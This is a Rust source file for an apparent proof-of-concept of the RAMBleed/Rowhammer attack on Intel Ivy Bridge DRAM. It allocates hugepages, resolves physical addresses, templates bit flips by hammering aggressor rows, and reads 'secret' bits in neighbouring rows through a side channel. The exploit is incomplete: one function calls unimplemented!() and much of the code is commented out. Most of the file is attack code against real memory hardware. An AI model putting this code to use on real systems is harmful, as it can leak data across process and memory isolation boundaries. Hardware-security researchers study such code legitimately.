#![feature(try_trait)]
#![feature(asm)]

mod alloc;
mod architecture;
mod config;
mod hammer;
mod intelivy;
mod memmap;
mod profile;
use crate::alloc::reverse_mapping;
use crate::profile::create_stats;
use crate::alloc::virt_to_phys_pagemap;
use crate::alloc::{alloc_1gb_hugepage, alloc_2mb_buddy, alloc_2mb_hugepage, contig_mem_diff};
use crate::architecture::{Architecture, DramAddr};
use crate::config::Config;
use crate::hammer::{hammer, reads_per_refresh};
use crate::intelivy::IntelIvy;
use crate::memmap::{offset_to_dram, DramRange, MemMap};
use crate::profile::profile_ranges;
use crate::profile::Direction::{From0To1, From1To0};
use crate::profile::{profile_addr, Flip};
use vm_info::page_size;
use std::collections::{HashMap, HashSet};

const _READ_MULTIPLICATOR: usize = 2;

// place the secret at buf + offset by unmapping part of buf
fn place_secret(buf: &mut MemMap, da: &DramAddr, c: &Config) -> Result<(), String> {
    // place the secret at buf + offset by unmapping part of buf
    // POC here
    *buf.at_dram(da, c) = 0xff;
    //let dram_secret = offset_to_dram(offset, c);
    let remove_range = unimplemented!();
    // remove address from the row
    //let row_ranges = buf.same_row_ranges(&dram_secret);
    //    let mut row_ranges_new = Vec::new();
    //    for r in row_ranges {
    //        let start_offset = c.arch.dram_to_phys(&r.start.clone());
    //        if start_offset < offset && offset >= start_offset + r.bytes {
    //            row_ranges_new.push(r.clone());
    //        } else {
    //            let r1 = DramRange { start: r.start.clone(), bytes: start_offset - offset };
    //            if r1.bytes > 0 {
    //                row_ranges_new.push(r1);
    //            }
    //            let r2 = DramRange {
    //                start: offset_to_dram(offset + 1, c),
    //                bytes: r.bytes - (start_offset - offset) - 1,
    //            };
    //            if r2.bytes > 0 {
    //                row_ranges_new.push(r2);
    //            }
    //        }
    //    }

    //buf.range_map.insert(dram_secret.to_row_index(),
    //
    //                     row_ranges_new);
    buf.remove_range(remove_range);
    Ok(())
}

// find an address in the row as buf + offset that is mapped in buf
fn same_row_addr(buf: &MemMap, da: DramAddr, c: &Config) -> Option<DramAddr> {
    //let offset_aligned = offset - offset % page_size().unwrap_or(4096);
    let ranges = buf.same_row_ranges(&da);
    if let Some (r) = ranges.get(0) {
        Some(r.start.clone())
    } else {
        None
    }
}

fn read_sidechannel(mem: &mut MemMap, flip: &Flip, c: &Config) -> Option<bool> {
    let &mut flip_byte = mem.at_dram(&flip.pos, c);//buf[flip.offset];
    let flip_bit = flip_byte & (1 << flip.pos.bit) != 0;
    // hammering makes the vulnerable bit equal its neighbors
    Some(flip_bit)
}

fn fill_victim(buf: &mut MemMap, flip: &Flip, c: &Config) {
    *buf.at_dram(&flip.pos, c) = match flip.dir {
        From0To1 => 0x00,
        From1To0 => 0xff,
    };
}

// buf is 2MB-aligned
fn bool_exploit_flip(mem: &mut MemMap, flip: &Flip, c: &Config) -> Option<bool> {
    let cell_above = flip.pos.row_above();
    let cell_below = flip.pos.row_below();
    place_secret(mem, &cell_above, c).expect("failed to place secret");
    place_secret(mem, &cell_below, c).expect("failed to place secret");
    //let secret_above = offset_above(mem, flip.offset, c)?;
    //let secret_below = offset_below(mem, flip.offset, c)?;
    //place_secret(mem, align_page_offset(secret_above), c).ok()?;
    //place_secret(mem, align_page_offset(secret_below), c).ok()?;
    let aggressor_above = same_row_addr(mem, cell_above, c).expect("no address above exists");
    let aggressor_below = same_row_addr(mem, cell_below, c).expect("no address below exists");

    //Fill flip address according to flip.dir
    fill_victim(mem, flip, c);

    hammer(
        mem.at_dram(&aggressor_above, c),
        mem.at_dram(&aggressor_below, c),
        c.reads_per_hammer,
    );

    read_sidechannel(mem, flip, c)
}

fn align_page_offset(offset: usize) -> usize {
    let page_size = page_size().unwrap_or(4096);
    offset - offset % page_size
}

// return offset of the address in the row above buf + offset
fn offset_above(_buf: &MemMap, offset: usize, c: &Config) -> Option<usize> {
    let mut dram_addr = offset_to_dram(offset, c);
    if dram_addr.row == 0 {
        return None;
    }
    dram_addr.row -= 1;
    Some(c.arch.dram_to_phys(&dram_addr))
}

// return offset of the address in the row below buf + offset
fn offset_below(_buf: &MemMap, offset: usize, c: &Config) -> Option<usize> {
    let mut dram_addr = offset_to_dram(offset, c);
    // TODO: return None if dram_addr.row = c.MAX_ROW?
    //if dram_addr.row == unimplemented!() {
    //    return None
    //}
    dram_addr.row += 1;
    Some(c.arch.dram_to_phys(&dram_addr))
}

fn template_dram_addr(mem: &mut MemMap, da: &DramAddr, c: &Config) -> Vec<Flip> {
    let mut flips = vec![];
    assert!(da.row != 0 && da.row != std::u16::MAX);

    println!(
        "({}, {}, {}, {}): row {}",
        da.chan, da.dimm, da.rank, da.bank, da.row
    );

    // 1 to 0
    flips.append(profile_addr(mem, da, 0x00, c).as_mut());
    flips.append(profile_addr(mem, da, 0xff, c).as_mut());

    flips
}

fn template_2mb_contig(mem: &mut MemMap, c: &Config) -> Vec<Flip> {
    let mut flips = vec![];

    for (da, rs) in mem.get_ranges().clone() {
        if da.row == 0 || da.row == std::u16::MAX {
            continue;
        }
        println!("({}, {}, {}, {}): row {}", da.chan, da.dimm, da.rank, da.bank, da.row);

        let row_above = mem.same_row_ranges(&da.row_above());
        let row_below = mem.same_row_ranges(&da.row_below());

        let mut flips_above = profile_ranges(mem, &row_above, &row_below, &rs, 0x00, c);
        let mut flips_below = profile_ranges(mem, &row_above, &row_below, &rs, 0xff, c);
        flips.append(&mut flips_above);
        flips.append(&mut flips_below);
    }

    flips
}

pub fn test_contig_mem_diff(c: &Config) {
    let mem_attack = alloc_1gb_hugepage(c).unwrap();
    println!("Allocated memory successfully at {:?}", &mem_attack[0]);
    let start_p = virt_to_phys_pagemap(&mem_attack[0]).unwrap();
    print!("phys: {:X}", start_p);
    //let end_p = virt_to_phys(unsafe { mem_attack.add(2 * 1<<20 - 1) }).unwrap();
    //assert_eq!(start_p + 2 * 1<<20 - 1, end_p)
}

pub fn test_alloc(c: &Config) {
    contig_mem_diff(c);
}

pub fn test_template(c: &Config) {
    let mut mem_attack = alloc_2mb_buddy(&c).unwrap();
    let flips = template_2mb_contig(&mut mem_attack, &c);
    println!("Found flips: {:?}", flips)
}

pub fn test_rambleed() {
    let c: Config = Config {
        aligned_bits: 20,
        reads_per_hammer: 100,
        contiguous_dram_addr: 0,
        arch: Box::new(IntelIvy {
            dual_channel: false,
            dual_dimm: false,
            dual_rank: true,
        }),
    };
    let mut mem_attack = alloc_2mb_buddy(&c).unwrap();
    let flips = template_2mb_contig(&mut mem_attack, &c);
    for f in flips {
        let val = bool_exploit_flip(&mut mem_attack, &f, &c);
        println!("Secret value is {:?}", val);
    }
}

fn row_conflict_pair(mem: &MemMap) -> Option<(DramAddr, DramAddr)> {
    for (da1, a1s) in mem.get_ranges().iter() {
        let a1 = a1s.get(0);
        let a2: Option<&DramRange> = mem
            .get_ranges()
            .iter()
            .filter(|(da2, a2s)| {
                da1.chan == da2.chan
                    && da1.dimm == da2.dimm
                    && da1.rank == da2.rank
                    && da1.bank == da2.bank
                    && da1.row != da2.row
                    && !a2s.is_empty()
            })
            .map(|(_, a2s)| &a2s[0])
            .next();

        match (a1, a2) {
            (None, _) => continue,
            (_, None) => continue,
            (Some(a1), Some(a2)) => return Some((a1.start.clone(), a2.start.clone())),
        }
    }

    None
}

fn calibrate<T: Architecture>(mem: &MemMap, a: T) -> usize {
    let (a1, a2) = row_conflict_pair(mem).expect("No row conflict pair found! Calibration failed");
    let a1 = mem.offset(a.dram_to_phys(&a1));
    let a2 = mem.offset(a.dram_to_phys(&a2));
    2 * reads_per_refresh(a1, a2, a.refresh_period())
}

fn test_stats(c : &Config) {
    let mut mem_attack = alloc_2mb_hugepage(&c).expect("Failed to allocate memory using hugepages");

    let addr_old = DramAddr {
        chan: 0,
        dimm: 0,
        rank: 1,
        bank: 1,
        row: 7,
        col: 731,
        byte: 0,
        bit: 6,
    };

    let addr_likely = DramAddr {
        chan: 0,
        dimm: 0,
        rank: 0,
        bank: 4,
        row: 10,
        col: 648,
        byte: 5,
        bit: 6,
    };

    let addr = DramAddr {
        chan: 0,
        dimm: 0,
        rank: 1,
        bank: 1,
        row: 7,
        col: 731,
        byte: 0,
        bit: 6,
    };

    let mut flips = template_dram_addr(&mut mem_attack, &addr, &c);
    //let mut flips = template_2mb_contig(&mut mem_attack, &c);
    println!("Found the following flips {:?}", flips);
    println!(
        "Flips as DRAM: {:?}",
        flips
    );

    for f in flips.iter_mut() {
        create_stats(&mut mem_attack, f, &c);
        println!("{:#?}", f);
    }
}

fn main() {
    let arch = IntelIvy {
        dual_channel: false,
        dual_dimm: false,
        dual_rank: true,
    };
    let mut c: Config = Config {
        aligned_bits: 20,
        reads_per_hammer: 0,
        contiguous_dram_addr: 1 << 12,
        arch: Box::new(arch.clone()),
    };

    //let mut mem_attack = alloc_2mb_hugepage(&c).expect("Failed to allocate memory using hugepages");
    //let off = reverse_mapping(&c, mem_attack.as_mut_ptr());
    //println!("Page offset to 2 mb: {:?}", off);
    //println!(
    //    "Allocated memory successfully at {:?}",
    //    (*mem_attack).as_ptr()
    //);

    //let start_p = virt_to_phys_pagemap(mem_attack.as_ptr()).unwrap_or(std::usize::MAX);
    //println!("Physical address: {:p}", start_p as *const usize);

    //c.reads_per_hammer = calibrate(&mem_attack, arch);
    //println!(
    //    "Calibrated to {} iterations per hammering",
    //    c.reads_per_hammer
    //);


    contig_mem_diff(&c);
    //println!("{:#?}", offset_to_dram(0, &c));
    //println!("{:#?}", offset_to_dram(1002000, &c));
    //println!("{:#?}", mem_attack);
    //contig_mem_diff(&c);
}
